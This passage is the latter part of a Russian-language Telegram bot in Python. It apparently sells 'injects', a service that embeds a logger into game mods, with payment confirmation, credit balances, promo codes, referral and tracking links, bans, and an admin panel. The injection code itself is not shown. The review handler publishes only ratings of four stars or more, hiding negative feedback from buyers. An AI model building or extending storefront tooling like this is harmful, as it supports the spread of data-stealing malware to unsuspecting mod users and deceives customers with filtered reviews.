            inline_keyboard=[
                [InlineKeyboardButton(text=f"🚫 Отклонено (варн {warns})", callback_data="done")]
            ]
        )
    )
    if warns >= 3:
        await callback.message.answer(
            f"🚫 Пользователь <code>{target}</code> получил <b>3 варна</b> "
            f"и был <b>заблокирован</b>."
        )
    try:
        if warns >= 3:
            await bot.send_message(
                int(target),
                f"🚫 <b>Ты заблокирован.</b>\n\n"
                f"Твоя заявка отклонена по причине <b>ложной заявки</b>.\n"
                f"Это уже <b>3-й варн</b> — доступ к боту закрыт.\n\n"
                f"Для разблокировки напиши в поддержку: {SUPPORT_URL}",
            )
        else:
            await bot.send_message(
                int(target),
                f"⚠️ <b>Твоя заявка отклонена.</b>\n\n"
                f"Причина: подарок/оплата не найдены "
                f"(ложная заявка).\n\n"
                f"Предупреждение: <b>{warns}/3</b>.\n"
                f"После <b>3 ложных заявок</b> — блокировка бота.",
            )
    except Exception:
        pass


@router.callback_query(F.data.startswith("confirm:"))
async def admin_confirm_payment(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("❌ Только для администратора", show_alert=True)
        return
    _, target, count = callback.data.split(":")
    count = int(count)
    user = get_user(target)
    if user is None:
        user = create_user(target, target)
    user["injects"] = user.get("injects", 0) + count
    save_users(users)
    await callback.answer("✅ Инжекты начислены", show_alert=True)
    await callback.message.edit_reply_markup(
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text="✅ Подтверждено", callback_data="done")]]
        )
    )
    try:
        await bot.send_message(
            int(target),
            f"🎁 <b>Оплата подтверждена!</b>\n\n"
            f"Тебе начислено <b>{count}</b> инжект(ов).\n"
            f"Твой баланс: <b>{user['injects']}</b>\n\n"
            f"Нажми «Вшить логгер в мод» и получи свой мод.",
        )
    except Exception:
        pass


@router.message(Command("me"))
async def my_info(message: Message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if user is None:
        user = create_user(user_id, message.from_user.username or "")
    await message.answer(
        f"👤 <b>Твой профиль</b>\n\n"
        f"🆔 <b>Telegram ID:</b> <code>{user_id}</code>\n"
        f"💳 <b>Инжектов:</b> {user.get('injects', 0)}\n"
        f"👥 <b>Пригласил друга:</b> {'✅ да' if user.get('has_invited') else '❌ нет'}\n"
        f"🔗 <b>Реферальная ссылка:</b>\n"
        f"<code>https://t.me/{BOT_USERNAME}?start={user.get('invite_code')}</code>\n\n"
        f"Пригласи друга — получишь ещё 1 инжект 🎁"
    )


@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    await message.answer(
        "🛠 <b>Админ панель</b>\n\n"
        "Команды управления:\n\n"
        "📊 <code>/stats</code> — статистика бота\n"
        "👥 <code>/users</code> — список всех пользователей\n"
        "🔍 <code>/info &lt;user_id&gt;</code> — полная инфа по пользователю\n"
        "🎁 <code>/give &lt;user_id&gt; &lt;count&gt;</code> — выдать инжекты пользователю\n"
        "✂️ <code>/take &lt;user_id&gt; &lt;count&gt;</code> — забрать инжекты\n"
        "🔑 <code>/createpromo &lt;код&gt; &lt;инжекты&gt; &lt;макс.&gt;</code> — создать промокод\n"
        "📋 <code>/promos</code> — список промокодов\n"
        "🔄 <code>/resetreview &lt;user_id&gt;</code> — сбросить отзыв\n"
        "🚫 <code>/block &lt;user_id&gt;</code> — заблокировать пользователя\n"
        "✅ <code>/unblock &lt;user_id&gt;</code> — разблокировать\n\n"
        "🔗 <code>/genlink &lt;user_id&gt;</code> — трекинг-ссылка\n"
        "📊 <code>/links</code> — статистика трекинг-ссылок\n\n"
        "Все команды доступны только администраторам."
    )


@router.message(Command("stats"))
async def admin_stats(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    total = len(users)
    all_injects = sum(u.get("injects", 0) for u in users.values())
    blocked = sum(1 for u in users.values() if u.get("blocked"))
    invited = sum(1 for u in users.values() if u.get("has_invited"))
    await message.answer(
        f"📊 <b>Статистика бота</b>\n\n"
        f"👥 Пользователей: <b>{total}</b>\n"
        f"💳 Инжектов в системе: <b>{all_injects}</b>\n"
        f"🚫 Заблокировано: <b>{blocked}</b>\n"
        f"👥 Пригласили друга: <b>{invited}</b>"
    )


@router.message(Command("users"))
async def admin_list_users(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    if not users:
        await message.answer("Пользователей пока нет.")
        return
    lines = []
    for uid, u in users.items():
        status = "🚫" if u.get("blocked") else "✅"
        lines.append(
            f"{status} <code>{uid}</code> | @{u.get('username', '?')} | 💳 {u.get('injects', 0)}"
        )
    await message.answer(
        f"👥 <b>Пользователи ({len(users)}):</b>\n\n" + "\n".join(lines)
    )


@router.message(Command("info"))
async def admin_user_info(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = message.text.split()
    if len(parts) < 2:
        await message.answer("❌ Формат: <code>/info &lt;user_id&gt;</code>")
        return
    target = parts[1]
    user = get_user(target)
    if user is None:
        await message.answer(f"❌ Пользователь <code>{target}</code> не найден.")
        return
    used_promos = user.get("used_promos", [])
    if isinstance(used_promos, str):
        used_promos = json.loads(used_promos)
    await message.answer(
        f"👤 <b>Информация о пользователе</b>\n\n"
        f"🆔 <b>ID:</b> <code>{user.get('user_id', target)}</code>\n"
        f"📛 <b>Username:</b> @{user.get('username', '?')}\n"
        f"💳 <b>Инжектов:</b> {user.get('injects', 0)}\n"
        f"👥 <b>Пригласил друга:</b> {'✅ да' if user.get('has_invited') else '❌ нет'}\n"
        f"🔗 <b>Приглашён:</b> {user.get('invited_by') or 'нет'}\n"
        f"🔗 <b>Реферальный код:</b> <code>{user.get('invite_code', '?')}</code>\n"
        f"🚫 <b>Заблокирован:</b> {'✅ да' if user.get('blocked') else '❌ нет'}\n"
        f"⚠️ <b>Варнов:</b> {user.get('warns', 0)}/3\n"
        f"📝 <b>Отзыв оставлен:</b> {'✅ да' if user.get('has_reviewed') else '❌ нет'}\n"
        f"🎟 <b>Промокоды:</b> {', '.join(used_promos) if used_promos else 'нет'}\n"
        f"📅 <b>Дата регистрации:</b> {time.strftime('%d.%m.%Y %H:%M', time.localtime(user.get('created', 0))) if user.get('created') else 'нет'}"
    )


@router.message(Command("genlink"))
async def admin_genlink(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = message.text.split()
    if len(parts) < 2:
        await message.answer("❌ Формат: <code>/genlink &lt;user_id&gt;</code>")
        return
    target = parts[1]
    user = get_user(target)
    if user is None:
        await message.answer(f"❌ Пользователь <code>{target}</code> не найден.")
        return
    admin_links = load_admin_links()
    code = "A" + "".join(random.choices(string.ascii_letters + string.digits, k=10))
    admin_links[code] = {"admin_id": str(message.from_user.id), "target_id": target, "uses": 0}
    save_admin_links(admin_links)
    await message.answer(
        f"🔗 <b>Трекинг-ссылка создана!</b>\n\n"
        f"👤 Привязана к: <code>{target}</code> (@{user.get('username', '?')})\n"
        f"🔗 Ссылка:\n<code>https://t.me/{BOT_USERNAME}?start={code}</code>\n\n"
        f"📌 По этой ссылке ничего не выдаётся — только трекинг.\n"
        f"Статистика: <code>/links</code>"
    )


@router.message(Command("links"))
async def admin_links_list(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    admin_links = load_admin_links()
    if not admin_links:
        await message.answer("Ссылок пока нет.")
        return
    lines = []
    for code, data in admin_links.items():
        target = data.get("target_id", "?")
        uses = data.get("uses", 0)
        user = get_user(target)
        uname = user.get("username", "?") if user else "?"
        lines.append(
            f"🔗 <code>{code}</code>\n"
            f"   👤 @{uname} (<code>{target}</code>) | 👥 Переходов: <b>{uses}</b>"
        )
    await message.answer(
        f"📋 <b>Трекинг-ссылки ({len(admin_links)}):</b>\n\n" + "\n\n".join(lines)
    )


@router.message(Command("give"))
async def admin_give(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = message.text.split()
    if len(parts) < 3:
        await message.answer(
            "❌ Формат: <code>/give &lt;user_id&gt; &lt;count&gt;</code>\n\n"
            "Пример: <code>/give 123456789 5</code>"
        )
        return
    target, count = parts[1], int(parts[2])
    if target not in users:
        await message.answer(
            f"❌ Пользователь <code>{target}</code> не найден в базе.\n\n"
            f"Проверь ID или попроси пользователя написать боту."
        )
        return
    users[target]["injects"] = users[target].get("injects", 0) + count
    save_users(users)
    await message.answer(
        f"✅ Выдано <b>{count}</b> инжектов пользователю <code>{target}</code>\n"
        f"Новый баланс: <b>{users[target]['injects']}</b>"
    )
    try:
        await bot.send_message(
            int(target),
            f"🎁 <b>Тебе начислено {count} инжектов!</b>\n\n"
            f"Нажми «Вшить логгер в мод» и получи свой мод.",
        )
    except Exception:
        pass


@router.message(Command("take"))
async def admin_take(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = message.text.split()
    if len(parts) < 3:
        await message.answer(
            "❌ Формат: <code>/take &lt;user_id&gt; &lt;count&gt;</code>\n\n"
            "Пример: <code>/take 123456789 2</code>"
        )
        return
    target, count = parts[1], int(parts[2])
    if target not in users:
        await message.answer(
            f"❌ Пользователь <code>{target}</code> не найден в базе.\n\n"
            f"Проверь ID или попроси пользователя написать боту."
        )
        return
    if count <= 0:
        await message.answer("❌ Количество должно быть больше нуля.")
        return
    current = users[target].get("injects", 0)
    if count >= current:
        removed = current
        users[target]["injects"] = 0
    else:
        removed = count
        users[target]["injects"] = current - count
    save_users(users)
    await message.answer(
        f"✅ Забрано <b>{removed}</b> инжектов у пользователя <code>{target}</code>\n"
        f"Новый баланс: <b>{users[target]['injects']}</b>"
    )
    try:
        await bot.send_message(
            int(target),
            f"⚠️ <b>У тебя забрано {removed} инжектов.</b>",
        )
    except Exception:
        pass


@router.message(Command("block"))
async def admin_block(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = message.text.split()
    if len(parts) < 2:
        await message.answer("❌ Формат: <code>/block &lt;user_id&gt;</code>")
        return
    target = parts[1]
    if target not in users:
        await message.answer(f"❌ Пользователь <code>{target}</code> не найден.")
        return
    users[target]["blocked"] = True
    save_users(users)
    await message.answer(f"🚫 Пользователь <code>{target}</code> заблокирован.")


@router.message(Command("unblock"))
async def admin_unblock(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = message.text.split()
    if len(parts) < 2:
        await message.answer("❌ Формат: <code>/unblock &lt;user_id&gt;</code>")
        return
    target = parts[1]
    if target not in users:
        await message.answer(f"❌ Пользователь <code>{target}</code> не найден.")
        return
    users[target]["blocked"] = False
    save_users(users)
    await message.answer(f"✅ Пользователь <code>{target}</code> разблокирован.")


@router.message(Command("resetreview"))
async def admin_reset_review(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = message.text.split()
    if len(parts) < 2:
        await message.answer(
            "❌ Формат: <code>/resetreview &lt;user_id&gt;</code>\n\n"
            "Сбросит отзыв пользователя — он сможет оставить новый."
        )
        return
    target = parts[1]
    if target not in users:
        await message.answer(f"❌ Пользователь <code>{target}</code> не найден.")
        return
    users[target]["has_reviewed"] = False
    save_users(users)
    await message.answer(
        f"✅ Отзыв пользователя <code>{target}</code> сброшен.\n"
        f"Теперь он может оставить новый отзыв."
    )
    try:
        await bot.send_message(
            int(target),
            "✅ <b>Твой отзыв был сброшен!</b>\n\n"
            "Теперь ты можешь оставить новый отзыв — нажми «⭐ Оценить бота» в меню."
        )
    except Exception:
        pass


@router.message(Command("createpromo"))
async def admin_create_promo(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = message.text.split()
    if len(parts) < 4:
        await message.answer(
            "❌ Формат: <code>/createpromo &lt;код&gt; &lt;инжекты&gt; &lt;макс. использований&gt;</code>\n\n"
            "Пример: <code>/createpromo INJECT5 5 10</code> — "
            "промокод на 5 инжектов, макс. 10 активаций"
        )
        return
    code = parts[1].upper()
    injects = int(parts[2])
    max_uses = int(parts[3])
    promos = load_promos()
    if code in promos:
        await message.answer(f"❌ Промокод <code>{code}</code> уже существует.")
        return
    promos[code] = {
        "injects": injects,
        "max_uses": max_uses,
        "uses_left": max_uses,
    }
    save_promos(promos)
    await message.answer(
        f"✅ Промокод создан!\n\n"
        f"🔑 Код: <code>{code}</code>\n"
        f"💳 Инжектов: <b>{injects}</b>\n"
        f"👥 Макс. использований: <b>{max_uses}</b>"
    )


@router.message(Command("promos"))
async def admin_list_promos(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    promos = load_promos()
    if not promos:
        await message.answer("Промокодов пока нет.")
        return
    lines = []
    for code, data in promos.items():
        lines.append(
            f"• <code>{code}</code> — "
            f"{data['injects']} инжект(ов), "
            f"использовано: {data['max_uses'] - data['uses_left']}/{data['max_uses']}"
        )
    await message.answer(
        f"📋 <b>Промокоды ({len(promos)}):</b>\n\n" + "\n".join(lines)
    )


@router.message(Command("promo"))
async def user_activate_promo(message: Message):
    parts = message.text.split()
    if len(parts) < 2:
        await message.answer("❌ Формат: <code>/promo &lt;код&gt;</code>")
        return
    code = parts[1].upper()
    promos = load_promos()
    promo = promos.get(code)
    if not promo:
        await message.answer(f"❌ Промокод <code>{code}</code> не найден.")
        return
    if promo["uses_left"] <= 0:
        await message.answer(f"❌ Промокод <code>{code}</code> уже исчерпан.")
        return
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    if user is None:
        user = create_user(user_id, message.from_user.username or "")
    used = user.get("used_promos", [])
    if code in used:
        await message.answer(
            f"❌ Ты уже активировал промокод <code>{code}</code>."
        )
        return
    user["injects"] = user.get("injects", 0) + promo["injects"]
    used.append(code)
    user["used_promos"] = used
    promo["uses_left"] -= 1
    save_users(users)
    save_promos(promos)
    await message.answer(
        f"🎁 <b>Промокод активирован!</b>\n\n"
        f"🔑 Код: <code>{code}</code>\n"
        f"💳 Начислено: <b>{promo['injects']}</b> инжект(ов)\n"
        f"💰 Твой баланс: <b>{user['injects']}</b>\n\n"
        f"Осталось использований: {promo['uses_left']}"
    )


@router.callback_query(F.data == "review")
async def review_start(callback: CallbackQuery):
    user_id = str(callback.from_user.id)
    user = get_user(user_id)
    if user is None:
        user = create_user(user_id, callback.from_user.username or "")
    if user.get("has_reviewed"):
        await callback.answer("❌ Ты уже оставил отзыв!", show_alert=True)
        return
    await callback.answer()
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="⭐", callback_data="rate:1"),
                InlineKeyboardButton(text="⭐⭐", callback_data="rate:2"),
                InlineKeyboardButton(text="⭐⭐⭐", callback_data="rate:3"),
            ],
            [
                InlineKeyboardButton(text="⭐⭐⭐⭐", callback_data="rate:4"),
                InlineKeyboardButton(text="⭐⭐⭐⭐⭐", callback_data="rate:5"),
            ],
        ]
    )
    await callback.message.answer(
        "📝 <b>Оцени бота</b>\n\nВыбери количество звёзд:",
        reply_markup=keyboard,
    )


@router.callback_query(F.data.startswith("rate:"))
async def review_rate(callback: CallbackQuery, state: FSMContext):
    user_id = str(callback.from_user.id)
    user = get_user(user_id)
    if user is None:
        user = create_user(user_id, callback.from_user.username or "")
    if user.get("has_reviewed"):
        await callback.answer("❌ Ты уже оставил отзыв!", show_alert=True)
        return
    stars = int(callback.data.split(":")[1])
    await state.update_data(stars=stars)
    await state.set_state(BotStates.review_comment)
    await callback.answer()
    await callback.message.answer(
        f"{'⭐' * stars}\n\n"
        f"💬 Напиши комментарий к отзыву\n"
        f"(или нажми «Пропустить»):",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="Пропустить", callback_data="comment:skip")]
            ]
        ),
    )


@router.callback_query(F.data.startswith("anon:"), BotStates.review_anon)
async def review_anon_choice(callback: CallbackQuery, state: FSMContext):
    user_id = str(callback.from_user.id)
    user = get_user(user_id)
    if user and user.get("has_reviewed"):
        await state.clear()
        await callback.answer("❌ Ты уже оставил отзыв!", show_alert=True)
        return
    choice = callback.data.split(":")[1]
    data = await state.get_data()
    await state.clear()
    stars = data.get("stars", 5)
    comment = data.get("comment", "")
    user_id = str(callback.from_user.id)
    user = get_user(user_id)
    if user is None:
        user = create_user(user_id, callback.from_user.username or "")
    user["has_reviewed"] = True
    save_users(users)

    if choice != "skip" and REVIEWS_CHANNEL and stars >= 4:
        if choice == "yes":
            author = "Аноним"
        else:
            author = f"@{callback.from_user.username}" if callback.from_user.username else callback.from_user.full_name

        stars_display = "⭐" * stars
        if comment:
            text = (
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"  {stars_display}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"💬 {comment}\n\n"
                f"👤 {author}"
            )
        else:
            text = (
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"  {stars_display}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"👤 {author}"
            )
        try:
            await bot.send_message(REVIEWS_CHANNEL, text)
        except Exception:
            pass

    await callback.answer("Спасибо за оценку! ✅")
    if stars < 4 and choice != "skip" and REVIEWS_CHANNEL:
        await callback.message.edit_text(
            f"✅ <b>Спасибо за оценку!</b>\n\n"
            f"Ты поставил «{'⭐' * stars}» — это поможет нам стать лучше.\n\n"
            f"📝 Отзывы с оценкой ниже 4 звёзд не публикуются в канале, "
            f"но мы обязательно учтём твоё мнение!"
        )
    else:
        await callback.message.edit_text(
            f"✅ <b>Спасибо за оценку!</b>\n\n"
            f"Ты поставил «{'⭐' * stars}» — это поможет нам стать лучше."
        )


@router.callback_query(F.data == "reviews")
async def reviews_list(callback: CallbackQuery):
    await callback.answer()
    if REVIEWS_CHANNEL:
        await callback.message.answer(
            "📝 <b>Отзывы</b>\n\nВсе отзывы читай в канале:",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="📝 Открыть отзывы", url=f"https://t.me/{REVIEWS_CHANNEL.lstrip('@')}")]
                ]
            ),
        )
    else:
        await callback.message.answer("📝 Канал с отзывами пока не настроен.")


async def main():
    global BOT_USERNAME
    me = await bot.me()
    BOT_USERNAME = me.username or "bot"
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())